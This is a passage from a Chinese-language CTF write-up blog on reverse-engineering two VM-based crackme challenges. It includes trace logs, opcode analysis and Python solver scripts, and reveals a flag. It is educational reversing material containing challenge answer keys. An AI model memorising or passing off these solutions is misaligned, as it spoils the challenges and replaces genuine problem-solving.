+ 1;</span><br><span class="line">112 ^ 74 = 58</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">74 ^ 179 = 249</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">179 ^ 98 = 209</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">98 ^ 198 = 164</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">198 ^ 213 = 19</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">213 ^ 169 = 124</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">A = 9 + 1;</span><br><span class="line">169 ^ 15 = 166</span><br><span class="line">A = 9 + 1;</span><br><span class="line">B = A + 1;</span><br><span class="line">15 ^ 146 = 157</span><br><span class="line">B = A + 1;</span><br><span class="line">C = B + 1;</span><br><span class="line">146 ^ 132 = 22</span><br><span class="line">C = B + 1;</span><br><span class="line">D = C + 1;</span><br><span class="line">132 ^ 229 = 97</span><br><span class="line">D = C + 1;</span><br><span class="line">E = D + 1;</span><br><span class="line">229 ^ 58 = 223</span><br><span class="line">E = D + 1;</span><br><span class="line">F = E + 1;</span><br><span class="line">58 ^ 36 = 30</span><br><span class="line">F = E + 1;</span><br><span class="line">10 = F + 1;</span><br><span class="line">36 ^ 18 = 54</span><br><span class="line">10 = F + 1;</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">18 ^ 127 = 109</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">127 ^ 176 = 207</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">176 ^ 108 = 220</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">108 ^ 86 = 58</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">86 ^ 194 = 148</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">194 ^ 211 = 17</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">211 ^ 0 = 211</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">0 ^ 154 = 154</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">154 ^ 140 = 22</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">140 ^ 242 = 126</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">242 ^ 239 = 29</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">239 ^ 62 = 209</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">62 ^ 25 = 39</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">25 ^ 118 = 111</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">118 ^ 66 = 52</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">66 ^ 180 = 246</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">180 ^ 110 = 218</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">110 ^ 202 = 164</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">23 = 22 + 1;</span><br><span class="line">202 ^ 221 = 23</span><br><span class="line">23 = 22 + 1;</span><br></pre></td></tr></table></figure><p>可以分析得到逻辑</p><pre><code>1. 在 vm_execute 的首个循环里，按照索引 i 计算掩码 ((0xAB + 0x13*i) &amp; 0xFF)，并对 buf[i] 做异或。2. 第二个循环把每个字节拆成高/低 4bit，通过 S 盒 sbox = [0xC,0x5,0x6,0xB,0x9,0x0,0xA,0xD,0x3,0xE,0xF,0x8,0x4,0x7,0x1,0x2] 逐一替换后再组合。3. 第三个循环按顺序执行 buf[i] ^= buf[(i+1)%35]（最后一个元素用已更新过的 buf[0]）。4. 校验</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0 * 19 = 0</span><br><span class="line">AB = 0 + AB;</span><br><span class="line">171 ^ 49 = 154</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">1 * 19 = 19</span><br><span class="line">BE = 13 + AB;</span><br><span class="line"></span><br><span class="line">190 ^ 49 = 143</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">2 * 19 = 38</span><br><span class="line">D1 = 26 + AB;</span><br><span class="line"></span><br><span class="line">209 ^ 49 = 224</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">3 * 19 = 57</span><br><span class="line">E4 = 39 + AB;</span><br></pre></td></tr></table></figure><p>很明显一直在更新0x13 ，再加个0xAB 这里dump时候都是16进制</p><p>再往下，到 “10 ^ 50 &#x3D; 56 &#x2F; 11D &#x3D; 72 + AB” 这一块，成对出现一条右移或与操作、紧接着又有 LOAD_TABLE16 那些断点打印（在 output.里为 &lt;值&gt; &gt;&gt; 4 &#x3D; …、&lt;值&gt; &lt;&lt; 4 &#x3D; …）。这些输出说明每个字节都被拆成高低 4 bit 送进 S 盒，再合成一个新字节。</p><p>所以”很容易”看出是 nibble S-box。</p><p>再往后的 “29 ^ 50 &#x3D; 47 … 58 ^ 36 &#x3D; 30 …” 那串，则是 LOAD_IN + ADD 1 + MOD 35 + XOR 的动作：输出[i] &#x3D; buffer[i] ^ buffer[(i+1)%35]。日志可以直白地呈现出 “A ^&#x3D; B”。特别是倒数几行还能看到最后一个元素在用已经更新过的 buffer[0]，说明是环形依赖。</p><p>stage2你要结合这个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013195026065.png" alt="image-20251013195026065"></p><p>其实还是有点难想到的</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">0x35</span>, <span class="number">0xF1</span>, <span class="number">0x6A</span>, <span class="number">0x09</span>, <span class="number">0xE8</span>, <span class="number">0x60</span>, <span class="number">0x95</span>, <span class="number">0xC7</span>, <span class="number">0xF5</span>, <span class="number">0xFE</span>,</span><br><span class="line">    <span class="number">0x3F</span>, <span class="number">0x29</span>, <span class="number">0xA8</span>, <span class="number">0xA7</span>, <span class="number">0x65</span>, <span class="number">0x11</span>, <span class="number">0xBD</span>, <span class="number">0x34</span>, <span class="number">0xB9</span>, <span class="number">0x53</span>,</span><br><span class="line">    <span class="number">0x92</span>, <span class="number">0x60</span>, <span class="number">0x1A</span>, <span class="number">0x7E</span>, <span class="number">0x46</span>, <span class="number">0xAA</span>, <span class="number">0x59</span>, <span class="number">0x56</span>, <span class="number">0x18</span>, <span class="number">0xBC</span>,</span><br><span class="line">    <span class="number">0x7A</span>, <span class="number">0x5B</span>, <span class="number">0x71</span>, <span class="number">0x4F</span>, <span class="number">0xA1</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">sbox = [<span class="number">0xC</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xB</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xA</span>, <span class="number">0xD</span>, <span class="number">0x3</span>, <span class="number">0xE</span>, <span class="number">0xF</span>, <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x1</span>, <span class="number">0x2</span>]</span><br><span class="line">inv_sbox = &#123;v: i <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(sbox)&#125;</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 环形xor</span></span><br><span class="line">xor_prefix = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">    xor_prefix ^= enc[i]</span><br><span class="line"></span><br><span class="line">stage2 = [<span class="number">0</span>] * n</span><br><span class="line">stage2[<span class="number">0</span>] = enc[-<span class="number">1</span>] ^ xor_prefix ^ enc[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">    stage2[i + <span class="number">1</span>] = stage2[i] ^ enc[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sbox</span></span><br><span class="line">stage1 = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> stage2:</span><br><span class="line">    hi = inv_sbox[b &gt;&gt; <span class="number">4</span>]</span><br><span class="line">    lo = inv_sbox[b &amp; <span class="number">0xF</span>]</span><br><span class="line">    stage1.append((hi &lt;&lt; <span class="number">4</span>) | lo)</span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(stage1):</span><br><span class="line">    mask = (<span class="number">0xAB</span> + <span class="number">0x13</span> * i) &amp; <span class="number">0xFF</span></span><br><span class="line">    flag.append(b ^ mask)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag).decode())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;Y0u_@4r3_R4@11&amp;_s0lxE_VVmm&#125;</span><br></pre></td></tr></table></figure><h3 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h3><p>侥幸之前看过(大概做到了把虚拟机的是线性变换发现就没做了hh)，但没有出，赛中出了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013200533177.png" alt="image-20251013200533177"></p><p>这里有个54C8函数进去看看</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013200557720.png" alt="image-20251013200557720"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013201401830.png" alt="image-20251013201401830"></p><p>结合55F4一起看，unk_1000096C0有点像vmcode不确定，55F4有点像vm的代码 switch的</p><p>没有发现主要的加密逻辑，基本能确定是vm了</p><p>sub_1000054C8这个方法，其实就是在做搭虚拟机实例，同时申请了三块区域，可能是虚拟机需要的数据区</p><p>一次ka你了 sub_1000057C8 等十余个函数，发现逻辑都很底层（逐位加法、移位乘法、手工 XOR）。根据行为重命名：vm_op_set_reg、vm_op_add_regs、vm_op_store_mem 等。例如 sub_100005d30 检查 data+0x1D6 的比较结果 + 36 次计数后输出“right”，因此这是终止条件。</p><p>输入长度为36</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013202635050.png" alt="image-20251013202635050"></p><p>55F4函数中 VM执行 ，遍历 8 字节的指令槽，读取末尾的 16 bit opcode，根据 opcode 调用 vtable 上不同的处理函数。循环次数固定 74888&#x2F;8&#x3D;9361 次</p><p>一次确认了那些函数的作用，如下面是一个加法操作</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013203246478.png" alt="image-20251013203246478"></p><p>有点抽象，这些vm_add的确实有点抽象，问GPT就知道了</p><p>做了个重命名</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013204617528.png" alt="image-20251013204617528"></p><p>sub_1000054C8把 off_1000080F8 填进新对象的第一个指针，并没有把它复制到字节码区，而是保存在结构的第一个字段。随后 vm_interpret 里，取指令时是从 v1[1]（也就是那块 0x14000 的缓冲）按 8 字节顺序读取，并把第四个 16 位字段当 opcode(v3 + n74888 + 6)。</p><p>其他三个 16 位字段（0&#x2F;2&#x2F;4）从未直接拿来做分支，只在各 handler 内按寄存器索引，内存地址等用途被解读。</p><p>前三个是操作数</p><p>之后想要进展，我们需要确认vm内存布局</p><p>解释器在 vm_write_data16&#x2F;vm_read_data16 等函数里不停地对某块内存+偏移做读写。如果不知道这些偏移对应什么，就无法理解每条 opcode 对状态的影响</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013205257487.png" alt="image-20251013205257487"></p><p>注意到几个信息</p><p>vm_write_small_reg 的实现是：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013205844754.png" alt="image-20251013205844754"></p><p>在做赋值操作，说明四个寄存器就放在数据块偏移 0x200 开始的连续 8 字节里。vm_read_small_reg 用同样的偏移读数，所以寄存器位点确定无疑。</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果参数 idx 在 1..4，就把 val 存到 base + 0x200 + 2*(idx-1)。与之成对的 vm_read_small_reg 用完全相同的偏移取回这个值。很明显这就是对固定数量槽位的读写，而不像普通内存（普通内存用的是 base + 2*addr）</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013210000999.png" alt="image-20251013210000999"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">相当于 *(WORD *)(context + 0x1D6) = (regA == regB);</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013210326302.png" alt="image-20251013210326302"></p><p>输入字符串在 data[0..35] ，4 个 16 位寄存器在 data+0x200，比较结果在 data+0x1D6，成功计数在 data+0x1D8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm_op_check_success 则先检查这个字，再把 *(WORD *)(context + 0x1D8) 自增；当它增到 36 时返回 “right”，否则若有任意一次失败直接调用 sub_1000055DC(&quot;wrong\n&quot;) 退出。这样就能定位比较结果和计数器的具体偏移。</span><br></pre></td></tr></table></figure><p>普通内存读写是：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013210408496.png" alt="image-20251013210408496"></p><p>总结下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data+idx*2 属于通用内存，data+0x200 起是4个寄存器槽，data+0x1D6/0x1D8 储存比较标志和成功计数。输入字符串被run_vm_from_input写进数据区开头</span><br></pre></td></tr></table></figure><p>因为vim_interpret是8字节8字节读取的，看逻辑我们解释器的 switch 里，合法opcode只有 case 1 到case 0xC共 12 种，自己手动确认了下确实那一段是bytecode,也可以写个小脚本读取确认下</p><p>确定字节码起点 0x96c0 后，我用 Python 读取那段数据，并按 8 字节一步解成 (arg0, arg1, arg2, opcode) 四个 16 位数，打印前面几十条</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chall&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x96c0</span>)</span><br><span class="line">    data=f.read(<span class="number">9360</span>*<span class="number">8</span>)</span><br><span class="line">insts=[struct.unpack_from(<span class="string">&#x27;&lt;HHHH&#x27;</span>, data, i*<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>)]</span><br><span class="line"><span class="keyword">for</span> i,(a,b,c,op) <span class="keyword">in</span> <span class="built_in">enumerate</span>(insts):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i:04d&#125;</span>: op=<span class="subst">&#123;op:04x&#125;</span> args=(<span class="subst">&#123;a:04x&#125;</span>,<span class="subst">&#123;b:04x&#125;</span>,<span class="subst">&#123;c:04x&#125;</span>)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>能发现a1516这样的块重复出现了约36次，对应flag长度36</p><p>输出显示比较总是在指令号 258、518、778…出现，而下一个 op&#x3D;9 紧随其后（259、519、779…）。因此每两次比较之间隔着 260 条指令，取这段长度作为一个块再去分析就能覆盖整个逻辑</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013212545236.png" alt="image-20251013212545236"></p><p>7出现的次数与flag长度相同也有理由怀疑其是cmp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chall&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x96c0</span>)</span><br><span class="line">    data = f.read(<span class="number">9360</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">insts = [struct.unpack_from(<span class="string">&#x27;&lt;HHHH&#x27;</span>, data, i * <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9360</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i, (a, b, c, op) in enumerate(insts):</span></span><br><span class="line"><span class="comment">#     print(f&#x27;&#123;i:04d&#125;: op=&#123;op:04x&#125; args=(&#123;a:04x&#125;,&#123;b:04x&#125;,&#123;c:04x&#125;)&#x27;)</span></span><br><span class="line"></span><br><span class="line">ops_used = &#123;op <span class="keyword">for</span> _, _, _, op <span class="keyword">in</span> insts&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;\nunique opcodes in first 9360 instructions: <span class="subst">&#123;<span class="built_in">sorted</span>(ops_used)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unique opcodes in first 300 instructions: [1, 3, 4, 5, 6, 7, 9, 10]</span><br></pre></td></tr></table></figure><p>只出现了这8种指令[1, 3, 4, 5, 6, 7, 9, 10]</p><p>意味着在整块里出现的 opcode 只有 1（set）、3（加）、4（xor）、5（store）、6（load）、7（compare）、9（check）、10（减）。发现 4 总是成对地把同一个寄存器和自己 XOR 为 0，用来清寄存器。没有乘法、取反、非线性操作。</p><p>很多条指令都是 op&#x3D;0001 args&#x3D;(0001,0026,0000)，即把寄存器 1 设为常量 0x26。接着马上就有 op&#x3D;0005 args&#x3D;(0001,0003,0000)，即用寄存器 1 里的值当地址，把寄存器 3 的内容写进数据区。这一对组合出现多次，说明 0x26 这个槽一直被当作累加器。</p><p>本题最终要的就是找指令规律和明确对应关系，还是要多试</p><p>我们可以写一个新的测试脚本探寻规律</p><p>可以用”临时线性化脚本”，其实就是把每条 opcode 的作用改写成”在字典里做加减”</p><ol><li><p>把一块 260 条指令读出来，每条 8 字节拆成 (dst, op1, op2, opcode)。</p></li><li><p>用字典表示寄存器&#x2F;内存的线性表达式：</p><ul><li>{‘const’: 0, ‘x0’:1, ‘x5’:65535} 表示 x0 - x5（因为 65535 ≡ -1 mod 65536）。</li><li>初始时 mem[i] &#x3D; {‘xi’:1, ‘const’:0} 代表输入的第 i 个字符。</li></ul></li><li><p>根据 opcode 更新这些字典：</p><ul><li>1：寄存器 ← 常量 → {‘const’: imm}。</li><li>3&#x2F;10：寄存器 ← 加&#x2F;减 → 合并字典系数。</li><li>5&#x2F;6：以寄存器值当地址，读写 mem。</li><li>4：异或清零 → 写成 {‘const’:0}。</li><li>7 之后我们不再需要处理（它只做比较）。</li></ul></li><li><pre><code> 块结束时，读出 mem[0x26]，得到某个输入字符的线性组合，regs[1][&#39;const&#39;] 就是常量目标。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">测试代码：</span><br><span class="line"></span><br><span class="line">&gt; 这个脚本挺难写的还好GPT5帮忙了，不然真写不出来......</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import struct</span><br><span class="line">from fractions import Fraction</span><br><span class="line"></span><br><span class="line">MOD = 1 &lt;&lt; 16</span><br><span class="line">BLOCK_SIZE = 260</span><br><span class="line">NUM_BLOCKS = 36</span><br><span class="line">BYTECODE_OFFSET = 0x96C0</span><br><span class="line">BYTECODE_LEN = BLOCK_SIZE * NUM_BLOCKS * 8</span><br><span class="line"></span><br><span class="line">def expr_const(v):</span><br><span class="line">    return &#123;&#x27;const&#x27;: v % MOD&#125;</span><br><span class="line"></span><br><span class="line">def expr_add(e1, e2):</span><br><span class="line">    keys = set(e1) | set(e2)</span><br><span class="line">    return &#123;k: (e1.get(k, 0) + e2.get(k, 0)) % MOD for k in keys&#125;</span><br><span class="line"></span><br><span class="line">def expr_sub(e1, e2):</span><br><span class="line">    keys = set(e1) | set(e2)</span><br><span class="line">    return &#123;k: (e1.get(k, 0) - e2.get(k, 0)) % MOD for k in keys&#125;</span><br><span class="line"></span><br><span class="line">def norm16(v):</span><br><span class="line">    return v - 0x10000 if v &gt;= 0x8000 else v</span><br><span class="line"></span><br><span class="line">def run_block(insts):</span><br><span class="line">    regs = &#123;i: &#123;&#x27;const&#x27;: 0&#125; for i in range(1, 5)&#125;</span><br><span class="line">    mem = &#123;i: &#123;f&#x27;x&#123;i&#125;&#x27;: 1, &#x27;const&#x27;: 0&#125; for i in range(36)&#125;</span><br><span class="line">    mem[0x26] = &#123;&#x27;const&#x27;: 0&#125;</span><br><span class="line">    for dst, op1, op2, opcode in insts:</span><br><span class="line">        if opcode == 1:  # set reg</span><br><span class="line">            regs[dst] = expr_const(op1)</span><br><span class="line">        elif opcode == 3:  # add</span><br><span class="line">            regs[dst] = expr_add(regs[op1], regs[op2])</span><br><span class="line">        elif opcode == 10:  # sub</span><br><span class="line">            regs[dst] = expr_sub(regs[op1], regs[op2])</span><br><span class="line">        elif opcode == 5:  # store</span><br><span class="line">            addr = regs[dst][&#x27;const&#x27;]</span><br><span class="line">            mem[addr] = dict(regs[op1])</span><br><span class="line">        elif opcode == 6:  # load</span><br><span class="line">            addr = regs[dst][&#x27;const&#x27;]</span><br><span class="line">            regs[op1] = dict(mem.get(addr, &#123;&#x27;const&#x27;: 0&#125;))</span><br><span class="line">        elif opcode == 4:  # xor -&gt; zero</span><br><span class="line">            regs[dst] = &#123;&#x27;const&#x27;: 0&#125;</span><br><span class="line">    expr = mem[0x26]</span><br><span class="line">    coeffs = [0] * 36</span><br><span class="line">    for name, val in expr.items():</span><br><span class="line">        if name == &#x27;const&#x27;:</span><br><span class="line">            continue</span><br><span class="line">        idx = int(name[1:])</span><br><span class="line">        coeffs[idx] = norm16(val)</span><br><span class="line">    target = norm16(regs[1][&#x27;const&#x27;])</span><br><span class="line">    return coeffs, target</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    with open(&#x27;chall&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">        f.seek(BYTECODE_OFFSET)</span><br><span class="line">        buf = f.read(BYTECODE_LEN)</span><br><span class="line"></span><br><span class="line">    rows = []</span><br><span class="line">    rhs = []</span><br><span class="line">    for blk in range(NUM_BLOCKS):</span><br><span class="line">        block = [</span><br><span class="line">            struct.unpack_from(&#x27;&lt;HHHH&#x27;, buf, blk * BLOCK_SIZE * 8 + i * 8)</span><br><span class="line">            for i in range(BLOCK_SIZE)</span><br><span class="line">        ]</span><br><span class="line">        coeffs, target = run_block(block)</span><br><span class="line">        rows.append(coeffs)</span><br><span class="line">        rhs.append(target)</span><br><span class="line"></span><br><span class="line">    for i, (row, target) in enumerate(zip(rows, rhs)):</span><br><span class="line">        nz = [(idx, val) for idx, val in enumerate(row) if val]</span><br><span class="line">        print(f&#x27;Block &#123;i:02d&#125; target=&#123;target:4d&#125; terms=&#123;len(nz)&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></code></pre></li></ol><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013215227593.png" alt="image-20251013215227593"></p><p>这 36 行输出各自对应虚拟机的 36 个检测块，意思是：</p><p>Block XX target&#x3D;YYY：这个块最终把data[0x26]累加成一个值，然后要求它等于常数 YYY。比如第一条 target&#x3D;-6，说明块 0 最终要求组合结果 &#x3D; -6。</p><p>terms&#x3D;36：这一块里把 36 个输入字符全部用到了（每个变量的系数都非零）。换句话说，Block 00 其实表示 Σ coeff_i * x_i &#x3D; -6，这里的 coeff_i 包括正负 1、±其他整系数，x_i 就是 flag 第 i 个字符的 ASCII 值。</p><p>这些信息是我们后面构建线性方程组的原料。对每个块，我们不仅记录 target，还记录一整行 36 个系数（脚本里 run_block 返回的 coeffs）。把 36 行系数拼在一起，就是一个 36×36 的矩阵；把 36 个 target 拼成右端向量，然后解这个线性系统，就能得到 36 个字符的 ASCII 数值，自然就复原出 flag。</p><p>并不是拿具体输入去跑 VM，而是把每个寄存器&#x2F;内存槽都用符号表达式来表示（x0..x35 对应 36 个输入字符）。由于字节码里只出现了设常量、加&#x2F;减、内存读写这些线性操作，整条指令流对输入的影响天然是线性的，能一直用”符号系数”追踪下去。</p><p>因此，跑完一个块后得到的不是“实际值”，而是一个方程：memory[0x26] &#x3D; Σ coeff_i * x_i，而 reg1 给出同一块中设置的常数 target。这两者相等就形成了线性约束 Σ coeff_i * x_i &#x3D; target。</p><p>如果只盯住第一块，在这个块里把所有指令跑一遍，最终都会看到：该块把输入字符按特定系数累加到 memory[0x26]，然后和 reg1 里的常量比较。只要能把这串系数和常量提炼出来，就知道这一组的线性关系了。</p><p>在抽象出 36 条线性方程后，把它们堆成一个 36×36 的矩阵 A 和一个长度 36 的常量向量 b（脚本里 rows 和 rhs）</p><p>run_block得到关系，solve_linear来解开这个关系</p><p>举一个例子</p><p>只有三个指令，输入长度也只有3</p><ul><li>set rX, imm：把寄存器 rX 设成常数。</li><li>load rX, addr：读取数据区 mem[addr]（一开始就是输入字符）放进寄存器。</li><li>add rX, rY：把 rX &#x3D; rX + rY。</li><li>store addr, 